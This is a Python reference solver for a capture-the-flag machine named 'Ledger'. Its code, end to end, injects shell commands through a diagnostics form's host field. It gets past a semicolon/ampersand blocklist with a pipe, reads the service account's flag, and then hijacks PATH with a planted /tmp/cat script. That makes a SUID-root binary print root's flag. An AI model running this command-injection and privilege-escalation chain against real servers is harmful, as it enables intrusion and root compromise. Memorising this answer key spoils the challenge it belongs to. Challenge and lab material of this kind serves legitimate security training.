#!/usr/bin/env python3
"""Reference solver for Ledger.

Intended path:

1. Find the diagnostics form and confirm the host value reaches a shell.
2. Notice the blocklist rejects `;` and `&`, and step around it with a pipe.
3. Read the service account's flag -- the application runs as that account.
4. Escalate: /usr/local/bin/motd is SUID root and calls `cat` without an
   absolute path, so plant a `cat` earlier in PATH and let root run it.
5. Read root's flag.

Each request is its own shell, so the escalation is staged across several
rather than chained with a separator the filter would reject.
"""

import re
import sys

import requests

FLAG_RE = re.compile(r"destrier\{[0-9a-f]{16}\}")
TIMEOUT = 20


def run(base_url: str, payload: str) -> str:
    """Send one injected command and return the page it produced."""
    r = requests.post(f"{base_url}/diagnostics", data={"host": payload}, timeout=TIMEOUT)
    return r.text


def solve(base_url: str) -> dict[str, str | None]:
    base_url = base_url.rstrip("/")
    found: dict[str, str | None] = {"service-user": None, "root": None}

    # 1. the application is up and the form is there
    requests.get(f"{base_url}/", timeout=TIMEOUT).raise_for_status()

    # 2. the obvious separator is refused -- this is the filter, not a wall
    blocked = requests.post(
        f"{base_url}/diagnostics", data={"host": "127.0.0.1; id"}, timeout=TIMEOUT
    )
    assert blocked.status_code == 400, "expected `;` to be rejected"

    # ...and a pipe is not
    assert "uid=" in run(base_url, "127.0.0.1 | id"), "injection did not execute"

    # 3. the service account can read its own flag
    m = FLAG_RE.search(run(base_url, "127.0.0.1 | cat /home/svc/user.txt"))
    found["service-user"] = m.group(0) if m else None

    # 4. stage the PATH hijack. /tmp is writable by the service account, and
    #    `motd` will resolve `cat` there once PATH points at it first.
    #
    #    The planted script reads through /bin/cat by absolute path. Calling
    #    plain `cat` here would resolve back through the hijacked PATH to this
    #    same script, which recurses until the request times out.
    run(base_url, "127.0.0.1 | printf '#!/bin/sh\\n/bin/cat /root/root.txt\\n' > /tmp/cat")
    run(base_url, "127.0.0.1 | chmod +x /tmp/cat")

    # 5. root runs our `cat`, and prints root's flag instead of the notice
    m = FLAG_RE.search(run(base_url, "127.0.0.1 | env PATH=/tmp /usr/local/bin/motd"))
    found["root"] = m.group(0) if m else None

    return found


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <base-url>", file=sys.stderr)
        raise SystemExit(2)

    flags = solve(sys.argv[1])
    for gating, flag in flags.items():
        print(f"{gating:>13}: {flag or 'NOT FOUND'}")
    raise SystemExit(0 if all(flags.values()) else 1)
